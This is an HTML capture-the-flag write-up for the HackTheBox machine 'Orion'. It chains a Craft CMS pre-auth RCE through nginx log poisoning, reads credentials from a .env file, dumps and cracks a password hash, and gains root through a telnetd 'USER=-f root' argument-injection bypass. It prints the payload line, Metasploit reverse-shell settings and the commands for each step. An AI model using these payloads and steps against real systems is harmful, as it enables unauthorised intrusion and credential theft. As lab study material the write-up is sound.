@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>HTB: Orion — CraftCMS Preauth RCE to Telnetd Auth Bypass</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    background-color: #0a0e27;
+    color: #e0e0e0;
+    font-family: 'Courier New', monospace;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 40px 20px;
+    line-height: 1.6;
+  }
+  /* Animated grid background */
+  .bg-animation {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    opacity: 0.08;
+    background:
+      linear-gradient(90deg, transparent 98%, #00ff88 100%),
+      linear-gradient(0deg, transparent 98%, #00ff88 100%);
+    background-size: 50px 50px;
+    animation: grid-flow 20s linear infinite;
+  }
+  @keyframes grid-flow {
+    0% { transform: translateY(0); }
+    100% { transform: translateY(50px); }
+  }
+  a { color: #66d9ef; text-decoration: none; }
+  a:hover { color: #00ff88; text-decoration: underline; }
+  h1 {
+    color: #00ff88;
+    text-shadow: 0 0 8px rgba(0,255,136,0.5);
+    font-size: 2.2em;
+    margin-bottom: 10px;
+  }
+  h2 {
+    color: #00ff88;
+    border-bottom: 1px solid #1a1f3a;
+    padding-bottom: 8px;
+    margin-top: 50px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  h3 { color: #66d9ef; margin-top: 30px; }
+  .tags { margin: 15px 0 5px 0; }
+  .tag {
+    display: inline-block;
+    background: rgba(0,255,136,0.1);
+    border: 1px solid rgba(0,255,136,0.3);
+    color: #00ff88;
+    padding: 4px 12px;
+    margin-right: 8px;
+    font-size: 0.85em;
+    border-radius: 4px;
+  }
+  .tag.veasy {
+    background: rgba(0,255,136,0.2);
+    color: #00ff88;
+    border-color: #00ff88;
+  }
+  .meta { color: #888; font-size: 0.9em; margin-bottom: 30px; }
+  .meta b { color: #a0a0a0; }
+  code, pre {
+    background-color: #10152e;
+    border: 1px solid #232a4d;
+    border-radius: 4px;
+  }
+  code { padding: 2px 6px; font-size: 0.95em; color: #66d9ef; }
+  pre {
+    padding: 16px;
+    overflow-x: auto;
+    margin: 16px 0;
+    color: #b8e6c8;
+    border-left: 3px solid #00ff88;
+  }
+  pre code { border: none; padding: 0; color: inherit; background: none; }
+  .callout {
+    background: rgba(102,217,239,0.06);
+    border-left: 3px solid #66d9ef;
+    padding: 12px 18px;
+    margin: 20px 0;
+    color: #b0c4cc;
+  }
+  .callout.warn {
+    background: rgba(255,208,0,0.06);
+    border-left: 3px solid #ffd000;
+    color: #d8cfa0;
+  }
+  .divider {
+    border: none;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, #00ff88, transparent);
+    margin: 40px 0;
+  }
+  ul, ol { padding-left: 22px; }
+  li { margin-bottom: 6px; }
+  .back { display: inline-block; margin-bottom: 30px; color: #66d9ef; }
+  .flag-redacted {
+    color: #888;
+    font-style: italic;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+  }
+  th, td {
+    border: 1px solid #232a4d;
+    padding: 8px 12px;
+    text-align: left;
+  }
+  th {
+    color: #00ff88;
+    background: rgba(0,255,136,0.05);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+</style>
+</head>
+<body>
+
+<div class="bg-animation"></div>
+
+<a class="back" href="index.html#writeups">&larr; Back to all writeups</a>
+
+<h1>HTB: Orion — CraftCMS Preauth RCE to Telnetd Auth Bypass</h1>
+
+<div class="tags">
+  <span class="tag">HACKTHEBOX</span>
+  <span class="tag veasy">VERY EASY</span>
+  <span class="tag">LINUX</span>
+  <span class="tag">CRAFT CMS</span>
+  <span class="tag">CVE-2025-32432</span>
+  <span class="tag">CVE-2026-24061</span>
+  <span class="tag">METASPLOIT</span>
+</div>
+
+<div class="meta">
+  Author: th3_m4d_h4ck3r &nbsp;|&nbsp; Framework: Scarif Operations &nbsp;|&nbsp; Season 11
+</div>
+
+<h2>&gt; OVERVIEW</h2>
+
+<p>Orion is rated Very Easy, and the underlying vulnerabilities live up to
+that billing — an unauthenticated preauth RCE in Craft CMS, followed by a
+default env file leaking DB creds, followed by a genuinely comical
+authentication bypass in telnetd where the fix is quite literally "don't
+pass attacker input as a command-line flag." What made this one take longer
+than it should have wasn't the difficulty of the vulnerabilities — it was
+burning through three different community proof-of-concept scripts before
+landing on a version that actually worked cleanly.</p>
+
+<h2>&gt; RECON</h2>
+
+<pre>sudo nmap -sV -sC -p- --min-rate 5000 &lt;target&gt;</pre>
+
+<p>Only two ports externally: SSH (22) and HTTP (80), the latter serving a
+corporate telecom site with an <code>X-Powered-By: Craft CMS</code> header. The
+control panel footer confirmed the exact build:</p>
+
+<pre>Craft CMS 5.6.16</pre>
+
+<div class="callout">
+5.6.16 is the last vulnerable point release before Craft's April 2025
+patch (5.6.17) closed CVE-2025-32432. Always check the exact patch-level
+version against the CVE's affected range before assuming a hit or a miss —
+being one point release off either way changes everything.
+</div>
+
+<h2>&gt; FOOTHOLD — CVE-2025-32432 (CRAFT CMS PREAUTH RCE)</h2>
+
+<p>Craft's <code>AssetsController::actionGenerateTransform</code> action is registered
+as <code>allowAnonymous</code>, so it's reachable with zero authentication. It accepts
+a <code>handle</code> parameter that gets spread directly into a
+<code>Craft::createObject()</code> config array:</p>
+
+<pre>$transform = Craft::createObject([
+    'class' => ImageTransform::class,
+    ...$handle,
+]);</pre>
+
+<p>Because <code>$handle</code> is attacker-controlled, an array key beginning with
+<code>"as "</code> gets picked up by <code>yii\base\Component::__set()</code> as a behavior
+attachment — which calls <code>Yii::createObject()</code> on the attacker-supplied
+value <b>before any type check</b> on unpatched Yii2 versions (&lt;= 2.0.49).
+Pointing that at <code>yii\rbac\PhpManager</code> with a controlled <code>itemFile</code> is
+the whole game: <code>PhpManager::init()</code> calls <code>require $this-&gt;itemFile</code>, and
+PHP will happily execute any <code>&lt;?php ... ?&gt;</code> block inside whatever file
+that path points to.</p>
+
+<p>The most reliable sink for this on a fresh install is the nginx
+<code>access.log</code>: since it logs the request's <code>User-Agent</code> verbatim, sending
+a request with <code>User-Agent: &lt;?php system('id'); exit; ?&gt;</code> plants a live
+PHP payload at a predictable, always-writable path
+(<code>/var/log/nginx/access.log</code>), which the gadget chain then <code>require</code>s.</p>
+
+<div class="callout warn">
+Getting to a working exploit here took three attempts across different
+public PoC scripts, each breaking for a different reason:
+<ul style="margin-top:8px;">
+<li>Script #1 called <code>exec($_GET['cmd'])</code> without ever echoing the return value — PHP's <code>exec()</code> returns silently, so even a successful hit produced no visible output.</li>
+<li>Script #1 (revised) monkey-patched urllib3 to <code>unquote()</code> the entire outgoing URL to preserve raw PHP tags in one request — but this also corrupted URL-encoding on a second, unrelated request, mangling special characters in the command payload.</li>
+<li>Script #2 had a literal, unsubstituted placeholder string (<code>/tmp/sess_&lt;SessionID&gt;</code>) instead of an actual interpolated session ID — the gadget was pointed at a file that could never exist.</li>
+</ul>
+The Metasploit module (<code>exploit/linux/http/craftcms_preauth_rce_cve_2025_32432</code>)
+worked cleanly on the first attempt. When a public script exhibits inconsistent,
+hard-to-diagnose failures, check for a maintained framework module before
+sinking further time into patching someone else's proof-of-concept.
+</div>
+
+<pre>msfconsole -q
+search craftcms
+use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
+set RHOSTS orion.htb
+set RPORT 80
+set LHOST &lt;attacker_ip&gt;
+set LPORT 4444
+run</pre>
+
+<p>Landed a Meterpreter session as <code>www-data</code>.</p>
+
+<h2>&gt; PIVOT TO A REAL USER</h2>
+
+<p>Craft's default environment file was sitting in its usual spot with
+live, unredacted credentials:</p>
+
+<pre>find / -name ".env" 2>/dev/null | grep -i craft
+cat /var/www/html/craft/.env</pre>
+
+<pre>CRAFT_DB_USER=root
+CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!</pre>
+
+<p>That password didn't work directly for SSH against the box's one real
+user (<code>adam</code>) — a reminder that app-level DB credentials and system
+account passwords aren't always the same thing, even when reuse is a
+running theme across a session. Following the actual intended path: the
+DB credentials <i>did</i> grant access to the database itself, which contained
+Craft's own <code>users</code> table with a bcrypt password hash for the admin
+account (<code>adam@orion.htb</code>):</p>
+
+<pre>mysql -u root -p'SuperSecureCraft123Pass!' -h 127.0.0.1 orion \
+  -e "SELECT username, email, password FROM users;"</pre>
+
+<p>That hash cracked in seconds against rockyou:</p>
+
+<pre>john --wordlist=/usr/share/wordlists/rockyou.txt adam_hash.txt
+# darkangel</pre>
+
+<pre>ssh adam@orion.htb</pre>
+
+<p>User flag secured.</p>
+
+<h2>&gt; PRIVESC — CVE-2026-24061 (TELNETD AUTH BYPASS)</h2>
+
+<p>A quick look at listening services from inside the box turned up telnetd
+bound to localhost only:</p>
+
+<pre>ss -tlnp
+# 127.0.0.1:23  LISTEN</pre>
+
+<p>CVE-2026-24061 affects GNU InetUtils telnetd versions 1.9.3 through 2.7 —
+an authentication bypass that had apparently sat undiscovered in the
+codebase for roughly eleven years before disclosure. The root cause is
+almost absurdly simple: telnetd accepts a <code>USER</code> environment variable from
+the client during the TELNET protocol's NEW-ENVIRON option negotiation
+(RFC 1572), and passes that value <b>unsanitized</b> straight into the
+argument list used to invoke the system <code>login</code> program.</p>
+
+<div class="callout warn">
+Sending <code>USER=-f root</code> during negotiation causes telnetd to literally
+execute <code>login -f root</code>. The <code>-f</code> flag tells <code>login</code> to skip password
+verification entirely, on the assumption the caller has already
+pre-authenticated the user through some other means. telnetd never checks
+whether its own input could itself <i>be</i> a flag — a textbook argument
+injection vulnerability, and a stark reminder that any value crossing a
+trust boundary into a command's argv needs to be validated as data, never
+trusted as already-safe.
+</div>
+
+<p>Since telnetd is bound to <code>127.0.0.1</code> only, exploitation requires either
+running the PoC directly on the box, or tunneling the port back to the
+attacker machine:</p>
+
+<pre># from the attacker machine
+ssh -L 2323:127.0.0.1:23 adam@orion.htb
+
+# in a separate terminal
+git clone https://github.com/balgan/CVE-2026-24061.git
+cd CVE-2026-24061
+python3 exploit.py 127.0.0.1 2323</pre>
+
+<p>The exploit negotiates the NEW-ENVIRON option, supplies the malicious
+<code>USER=-f root</code> value, and the daemon spawns <code>login -f root</code> — no
+credentials, no prompt, straight to a root shell.</p>
+
+<pre>root@orion:~# cat /root/root.txt
+<span class="flag-redacted">[root flag captured ✅]</span></pre>
+
+<h2>&gt; ATTACK CHAIN SUMMARY</h2>
+
+<ol>
+  <li>Craft CMS 5.6.16 identified via response headers and control panel footer version string</li>
+  <li>Unauthenticated deserialization gadget chain (CVE-2025-32432) via the asset transform endpoint's <code>Craft::createObject()</code> spread → <code>yii\rbac\PhpManager</code> gadget → nginx access.log poisoning → RCE as <code>www-data</code></li>
+  <li>Craft's default <code>.env</code> file leaks live database credentials</li>
+  <li>DB access dumps Craft's own <code>users</code> table, yielding a bcrypt hash for the site's admin account</li>
+  <li>Hash cracks in seconds against rockyou → SSH access as the box's real system user</li>
+  <li>Internal-only telnetd discovered bound to localhost</li>
+  <li>CVE-2026-24061: telnetd passes the client-supplied <code>USER</code> environment variable unsanitized into <code>login</code>'s argv — sending <code>USER=-f root</code> executes <code>login -f root</code>, bypassing authentication entirely for an instant root shell</li>
+</ol>
+
+<h2>&gt; LESSONS LEARNED</h2>
+
+<ul>
+  <li>Version footers and <code>X-Powered-By</code> headers matter — knowing the exact patch level (5.6.16 vs. 5.6.17) is the difference between "definitely vulnerable" and "definitely wasting an afternoon."</li>
+  <li>Community proof-of-concept scripts vary wildly in quality even for the same, well-documented CVE. When a script fails inconsistently or in ways that don't match the documented vulnerability mechanics, check for a maintained Metasploit module before spending more time debugging someone else's code.</li>
+  <li>Application-level database credentials and OS-level user account passwords are often different things, even in environments with a general pattern of password reuse — test both angles rather than assuming one implies the other.</li>
+  <li>Any value that crosses from an untrusted client into a program's command-line arguments needs to be treated as potentially containing flags, not just "unexpected data." CVE-2026-24061 exists because telnetd validated that a username was present, but never considered that the value itself could be interpreted as a CLI switch by the program it invoked.</li>
+  <li>A service bound to <code>127.0.0.1</code> is not inherently safe — it just narrows the attacker's required foothold from "network access" to "any local access," which a foothold shell provides for free.</li>
+</ul>
+
+<hr class="divider">
+
+<p style="color:#6a7a85; font-size:0.85em;">
+Scarif Operations &nbsp;|&nbsp; th3m4dh4ck3r.com &nbsp;|&nbsp; CPTS prep, Season 11
+</p>
+
+</body>
+</html>
